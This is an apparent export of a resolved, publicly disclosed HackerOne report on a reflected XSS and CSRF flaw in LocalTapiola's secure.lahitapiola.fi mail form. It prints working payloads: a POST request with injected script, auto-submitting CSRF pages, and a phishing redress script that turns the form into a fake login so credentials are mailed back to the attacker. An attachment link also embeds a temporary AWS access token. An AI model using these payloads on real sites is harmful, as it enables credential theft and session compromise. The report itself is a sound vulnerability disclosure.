{"id":314518,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTQ1MTg=","url":"https://hackerone.com/reports/314518","title":"Reflected XSS+CSRF on secure.lahitapiola.fi","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-02-09T20:18:24.771Z","submitted_at":"2018-02-09T20:18:24.771Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"putsi","url":"/putsi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-03-02T04:01:12.313Z","bug_reporter_agreed_on_going_public_at":"2018-03-02T04:01:12.239Z","team_member_agreed_on_going_public_at":"2018-03-01T22:04:23.501Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Basic report information\n**Summary:** \nThe secure.lahitapiola.fi -mail application contains a reflected XSS vulnerability which can be exploited for example with CSRF-attack.\n\n**Description:** \nAs mentioned in the summary, the site contains a reflected cross-site scripting vulnerability. This vulnerability is present on the recipient-parameter which is used to specify destination email address of the email. \n\nThis recipient-parameter is normally not used on the first page of the email-flow, however by manually injecting it to the POST-request we can introduce an email address which will be placed on the resulting HTML-page as unsanitized value.\n\nAs the same functionality lacks any CSRF-protection, a CSRF-page can be crafted which will trigger the reflected XSS vulnerability when opened.\n\n**Impact:**\nThe vulnerability can be used at least to do the following:\n- Create open redirects via javascript.\n- Read all cookies that are scoped to lahitapiola-domain instead of the subdomain.\n- Read cookies of the secure-subdomain.\n- Maybe something else but I'm too tired to think and will post a comment if anything new pops up.\n\n## Browsers / Apps Verified In:\n\n  * Firefox\n\n## Steps To Reproduce:\n\n  1. Host the attached CSRF-PoC on a external server.\n  2. Open the hosted file with Firefox or any other browser that does not do proper XSS-sanitation.\n  3. Notice, that the reflected xss triggered and was run in context of the secure.lahitapiola.fi-domain.\n\n## Additional material\n\nSimple PoC-request for the XSS:\n\n```\nPOST /index.cgi HTTP/1.1\nHost: secure.lahitapiola.fi\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 164\n\nsender=█████████%40rot.fi\u0026page=2\u0026lang=en\u0026charset=utf-8\u0026formsubmit=Continue\u0026recipient=no-reply\"/\u003e\u003c/noscript\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e@lahitapiola.fi\n```\n\nExample attack by chaining to CSRF:\n```\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n  \u003cscript\u003ehistory.pushState('', '', '/')\u003c/script\u003e\n    \u003cform action=\"https://secure.lahitapiola.fi/index.cgi\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"sender\" value=\"secure\u0026#45;█████\u0026#64;rot\u0026#46;fi\" /\u003e\n      \u003cinput type=\"hidden\" name=\"page\" value=\"2\" /\u003e\n      \u003cinput type=\"hidden\" name=\"lang\" value=\"en\" /\u003e\n      \u003cinput type=\"hidden\" name=\"charset\" value=\"utf\u0026#45;8\" /\u003e\n      \u003cinput type=\"hidden\" name=\"formsubmit\" value=\"Continue\" /\u003e\n      \u003cinput type=\"hidden\" name=\"recipient\" value=\"no\u0026#45;reply\u0026quot;\u0026#47;\u0026gt;\u0026lt;\u0026#47;noscript\u0026gt;\u0026lt;script\u0026gt;alert\u0026#40;document\u0026#46;domain\u0026#41;\u0026lt;\u0026#47;script\u0026gt;\u0026#64;lahitapiola\u0026#46;fi\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      document.forms[0].submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Impact\n\nThe vulnerability can be used at least to do the following:\n- Create open redirects via javascript.\n- Read all cookies that are scoped to lahitapiola-domain instead of the subdomain.\n- Read cookies of the secure-subdomain.\n- Maybe something else but I'm too tired to think and will post a comment if anything new pops up.","vulnerability_information_html":"\u003ch2 id=\"basic-report-information\"\u003eBasic report information\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003cbr\u003e\nThe secure.lahitapiola.fi -mail application contains a reflected XSS vulnerability which can be exploited for example with CSRF-attack.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003cbr\u003e\nAs mentioned in the summary, the site contains a reflected cross-site scripting vulnerability. This vulnerability is present on the recipient-parameter which is used to specify destination email address of the email. \u003c/p\u003e\n\n\u003cp\u003eThis recipient-parameter is normally not used on the first page of the email-flow, however by manually injecting it to the POST-request we can introduce an email address which will be placed on the resulting HTML-page as unsanitized value.\u003c/p\u003e\n\n\u003cp\u003eAs the same functionality lacks any CSRF-protection, a CSRF-page can be crafted which will trigger the reflected XSS vulnerability when opened.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eImpact:\u003c/strong\u003e\u003cbr\u003e\nThe vulnerability can be used at least to do the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCreate open redirects via javascript.\u003c/li\u003e\n\u003cli\u003eRead all cookies that are scoped to lahitapiola-domain instead of the subdomain.\u003c/li\u003e\n\u003cli\u003eRead cookies of the secure-subdomain.\u003c/li\u003e\n\u003cli\u003eMaybe something else but I\u0026#39;m too tired to think and will post a comment if anything new pops up.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"browsers-apps-verified-in\"\u003eBrowsers / Apps Verified In:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eFirefox\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eHost the attached CSRF-PoC on a external server.\u003c/li\u003e\n\u003cli\u003eOpen the hosted file with Firefox or any other browser that does not do proper XSS-sanitation.\u003c/li\u003e\n\u003cli\u003eNotice, that the reflected xss triggered and was run in context of the secure.lahitapiola.fi-domain.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"additional-material\"\u003eAdditional material\u003c/h2\u003e\n\n\u003cp\u003eSimple PoC-request for the XSS:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /index.cgi HTTP/1.1\nHost: secure.lahitapiola.fi\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 164\n\nsender=█████████%40rot.fi\u0026amp;page=2\u0026amp;lang=en\u0026amp;charset=utf-8\u0026amp;formsubmit=Continue\u0026amp;recipient=no-reply\u0026quot;/\u0026gt;\u0026lt;/noscript\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;@lahitapiola.fi\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eExample attack by chaining to CSRF:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"c\"\u003e\u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ehistory\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epushState\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://secure.lahitapiola.fi/index.cgi\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;sender\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;secure\u0026amp;#45;█████\u0026amp;#64;rot\u0026amp;#46;fi\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;page\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;lang\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;en\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;charset\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;utf\u0026amp;#45;8\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;formsubmit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Continue\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;recipient\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;no\u0026amp;#45;reply\u0026amp;quot;\u0026amp;#47;\u0026amp;gt;\u0026amp;lt;\u0026amp;#47;noscript\u0026amp;gt;\u0026amp;lt;script\u0026amp;gt;alert\u0026amp;#40;document\u0026amp;#46;domain\u0026amp;#41;\u0026amp;lt;\u0026amp;#47;script\u0026amp;gt;\u0026amp;#64;lahitapiola\u0026amp;#46;fi\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforms\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe vulnerability can be used at least to do the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCreate open redirects via javascript.\u003c/li\u003e\n\u003cli\u003eRead all cookies that are scoped to lahitapiola-domain instead of the subdomain.\u003c/li\u003e\n\u003cli\u003eRead cookies of the secure-subdomain.\u003c/li\u003e\n\u003cli\u003eMaybe something else but I\u0026#39;m too tired to think and will post a comment if anything new pops up.\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":22,"voters":["demon1c","putsi","muon4","bl4de","tk0","bogdantcaciuc","ysx","yonm13","eveeez","ak1t4","and 12 more..."],"severity":{"rating":"medium","score":6.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":1050,"asset_type":"URL","asset_identifier":"secure.lahitapiola.fi","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2368729,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\n\n*Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report and http://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/. Also, our policy contains a lot of information on what is relevant and what is not.*\n\nAlso, welcome back.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eNote: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - \u003ca title=\"https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" href=\"/redirect?url=https%3A%2F%2Fsupport.hackerone.com%2Fhc%2Fen-us%2Farticles%2F211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca title=\"http://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/\" href=\"/redirect?url=http%3A%2F%2Fblog.bugcrowd.com%2Fadvice-for-writing-a-great-vulnerability-report%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Also, our policy contains a lot of information on what is relevant and what is not.\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eAlso, welcome back.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-09T20:20:14.343Z","updated_at":"2018-02-09T20:20:14.343Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2369108,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"One more impact of exploitation is social engineering attacks via spoofed content. \nAs the server uses pretty good CSP-policy, some tricks are required in the attack.\n\nWith the attached CSRF-page [1] we can redirect the user towards secure.lahitapiola.fi-website and quickly replace the page content. In this example, the page content is replaced so that it looks like a valid login page: F261946. \nThis replaced content however is simply still the original message-page with some elements hidden and some renamed. The sender-address is automatically set to the attacker's email and hidden. The recipient-address is set to non-existing Lahitapiola-email address and hidden. The subject-field is renamed to \"Kayttajanimi\" and the message-field is renamed to \"Salasana\". The attachment-section is hidden. \n\nNow when the victim tries to log in by filling the fields with own credentials and clicking the send-button, a message is sent to the non-existing Lahitapiola-email address which results in the message being bounced back to the sender who is the attacker in our case. Now when the attacker gets the email and reads it, the username and password of the victim are shown in the mail as \"subject\" and \"body\" of the undelivered message: F261950\n\nTL;DR: With some social engineering, sensitive user data can be delivered to the attacker with the messaging system. \n\n\n[1] Soc Eng CSRF Poc:\n\n```\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n  \u003cscript\u003ehistory.pushState('', '', '/')\u003c/script\u003e\n    \u003cform action=\"https://secure.lahitapiola.fi/index.cgi\" method=\"POST\" enctype=\"multipart/form-data\"\u003e\n      \u003cinput type=\"hidden\" name=\"sender\" value=\"secure\u0026#45;█████████\u0026#64;rot\u0026#46;fi\" /\u003e\n      \u003cinput type=\"hidden\" name=\"page\" value=\"2\" /\u003e\n      \u003cinput type=\"hidden\" name=\"lang\" value=\"en\" /\u003e\n      \u003cinput type=\"hidden\" name=\"charset\" value=\"utf\u0026#45;8\" /\u003e\n      \u003cinput type=\"hidden\" name=\"formsubmit\" value=\"Continue\" /\u003e\n      \u003cinput type=\"hidden\" name=\"recipient\" value=\"rikki\u0026quot;\u0026#47;\u0026gt;\u0026lt;\u0026#47;noscript\u0026gt;\u0026lt;input\u0026#32;type\u0026#61;\u0026quot;textbox\u0026quot;\u0026#32;name\u0026#61;\u0026quot;recipient\u0026quot;\u0026#32;class\u0026#61;\u0026quot;box\u0026quot;\u0026#32;size\u0026#61;\u0026quot;45\u0026quot;\u0026#32;value\u0026#61;\u0026quot;no\u0026#45;reply\u0026#64;lahitapiola\u0026#46;fi\u0026quot;\u0026#47;\u0026gt;\u0026lt;script\u0026gt;\u0026#36;\u0026#40;function\u0026#40;\u0026#41;\u0026#123;\u0026#36;\u0026#40;\u0026quot;\u0026#91;class\u0026#42;\u0026#61;\u0026apos;titletext\u0026apos;\u0026#32;i\u0026quot;\u0026#41;\u0026#46;text\u0026#40;\u0026quot;Kirjaudu\u0026#32;yritysten\u0026#32;viestipalveluun\u0026quot;\u0026#41;\u0026#59;\u0026#36;\u0026#40;\u0026quot;\u0026#91;class\u0026#42;\u0026#61;\u0026apos;subject\u0026apos;\u0026#32;i\u0026quot;\u0026#41;\u0026#46;html\u0026#40;\u0026quot;\u0026lt;strong\u0026gt;K\u0026amp;auml\u0026#59;ytt\u0026amp;auml\u0026#59;j\u0026amp;auml\u0026#59;nimi\u0026lt;\u0026#47;strong\u0026gt;\u0026quot;\u0026#41;\u0026#59;\u0026#36;\u0026#40;\u0026quot;\u0026#91;class\u0026#42;\u0026#61;\u0026apos;messagetext\u0026apos;\u0026#32;i\u0026quot;\u0026#41;\u0026#46;html\u0026#40;\u0026quot;\u0026lt;strong\u0026gt;Salasana\u0026lt;\u0026#47;strong\u0026gt;\u0026quot;\u0026#41;\u0026#59;\u0026#36;\u0026#40;\u0026quot;\u0026#91;class\u0026#42;\u0026#61;\u0026apos;attachment\u0026apos;\u0026#32;i\u0026quot;\u0026#41;\u0026#46;closest\u0026#40;\u0026quot;tr\u0026quot;\u0026#41;\u0026#46;hide\u0026#40;\u0026#41;\u0026#59;\u0026#36;\u0026#40;\u0026quot;\u0026#91;class\u0026#42;\u0026#61;\u0026apos;from\u0026apos;\u0026#32;i\u0026quot;\u0026#41;\u0026#46;closest\u0026#40;\u0026quot;tr\u0026quot;\u0026#41;\u0026#46;hide\u0026#40;\u0026#41;\u0026#59;\u0026#36;\u0026#40;\u0026quot;\u0026#91;class\u0026#42;\u0026#61;\u0026apos;totext\u0026apos;\u0026#32;i\u0026quot;\u0026#41;\u0026#46;closest\u0026#40;\u0026quot;tr\u0026quot;\u0026#41;\u0026#46;hide\u0026#40;\u0026#41;\u0026#59;\u0026#36;\u0026#40;\u0026quot;\u0026#91;name\u0026#42;\u0026#61;\u0026apos;message\u0026apos;\u0026#32;i\u0026quot;\u0026#41;\u0026#91;0\u0026#93;\u0026#46;rows\u0026#61;1\u0026#59;\u0026#36;\u0026#40;\u0026quot;\u0026#91;name\u0026#42;\u0026#61;\u0026apos;message\u0026apos;\u0026#32;i\u0026quot;\u0026#41;\u0026#91;0\u0026#93;\u0026#46;cols\u0026#61;45\u0026#59;\u0026#125;\u0026#41;\u0026#59;\u0026lt;\u0026#47;script\u0026gt;\u0026#64;lahitapiola\u0026#46;fi\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      document.forms[0].submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```","markdown_message":"\u003cp\u003eOne more impact of exploitation is social engineering attacks via spoofed content. \u003cbr\u003e\nAs the server uses pretty good CSP-policy, some tricks are required in the attack.\u003c/p\u003e\n\n\u003cp\u003eWith the attached CSRF-page [1] we can redirect the user towards secure.lahitapiola.fi-website and quickly replace the page content. In this example, the page content is replaced so that it looks like a valid login page: \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"redressed.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/261/946/83c6b08ddfc322eceb32c0663dcabb66e0ef95fb/redressed.png?response-content-disposition=attachment%3B%20filename%3D%22redressed.png%22%3B%20filename%2A%3DUTF-8%27%27redressed.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIKMJWH3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053254Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHST0svsvt2laJhuwhvtFHhDNQQ1aKmdn3kMewysqUdFAiEAulql%2B612sAbGAOHB%2F14rmdeeoxU5d8%2BAmcu4RPg%2BHwYqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDCOZXQ8CegoYVtnSUSqRAzpFu%2FKSCAPO9FvY239VSQoXSErgwDzOUTpVgc827sUNqeCED0HHoCoUKyy9kO1lyu0kSFcQXf%2BvW4%2FHwxvZX6%2BphIjx2iPQX6fNNwXKcgYQYxZ8Yx%2BGm7ZXLO%2Bu7Mdu4Fn%2B9TpJQODzePG4VEMMVtb0e6FjQNUF4kQegXC133f3aM6cYX7uAbjyFy7JY7I765EFvdZteqLx2HbWaDGqldcnvslHjs3kmodLKwk9H0Ue0DoWQaLX8Vd2A0w%2FRaO%2FD7%2FQ8PGTn1qam8KaVgzORyAVZ6DxjOPjltRKnxLgyDYBYkhJ4QrBrnmUJPgQMGGWlKZ9SGJYACF0xI0BTQYivNwVfXoTMKUGwE35iziKLaZ5lyBmkqGem%2B%2FfByDZktR%2BpZGSBgSAr1UOE7ov9eb7NhNIuMzcYuOJ1sDR5pR5AlZ4GHJ8eFAlsbYZ1%2B%2F1eXzICdlYRCTp7FQRaLOJji%2BGrr7%2BDGcfEbEP64XGp9sIHjMhhaQcRwVNC6OPA5jdwFCmOnkfeeCoszPtP9ulj%2BvRBs4QMJSFqv8FOusBWzRAvPHoeI1kjG3%2Bj8jYuqVFp2PPU1q0JXR0Ajo08RGvNLJbNpVdip6BBBoiu8PCrCZDZIOwjGA3KcL5o1c4azKc2WVxPog81MB%2FMbDqzX0ad%2FLlmri78RdsSnSIX3Tn18ZdjfTGjol%2FjXedojL6GsI5pB1YlY0EqbQvBnSvbUvPa2Yr7haLR%2FQ%2FG8J8lEfc9mqMV9Imaj1ospS%2BNuCXAlVOb%2F0ya3%2BR4cs2EQotvOugeHotyPJlDfJL6Pqjp0Z9ECJu9QNa4Vn1w2ANPlIUFD2oD6RnsM%2BFR3kpEUChJsMjzZDlljBwhF14Ww%3D%3D\u0026amp;X-Amz-Signature=9ca083b8a135190bc50ed6fac97389d9fcd7500409d070cc86c2fcdf89bebb20\" data-attachment-type=\"image/png\"\u003eredressed.png (F261946)\u003c/a\u003e. \u003cbr\u003e\nThis replaced content however is simply still the original message-page with some elements hidden and some renamed. The sender-address is automatically set to the attacker\u0026#39;s email and hidden. The recipient-address is set to non-existing Lahitapiola-email address and hidden. The subject-field is renamed to \u0026quot;Kayttajanimi\u0026quot; and the message-field is renamed to \u0026quot;Salasana\u0026quot;. The attachment-section is hidden. \u003c/p\u003e\n\n\u003cp\u003eNow when the victim tries to log in by filling the fields with own credentials and clicking the send-button, a message is sent to the non-existing Lahitapiola-email address which results in the message being bounced back to the sender who is the attacker in our case. Now when the attacker gets the email and reads it, the username and password of the victim are shown in the mail as \u0026quot;subject\u0026quot; and \u0026quot;body\u0026quot; of the undelivered message: F261950\u003c/p\u003e\n\n\u003cp\u003eTL;DR: With some social engineering, sensitive user data can be delivered to the attacker with the messaging system. 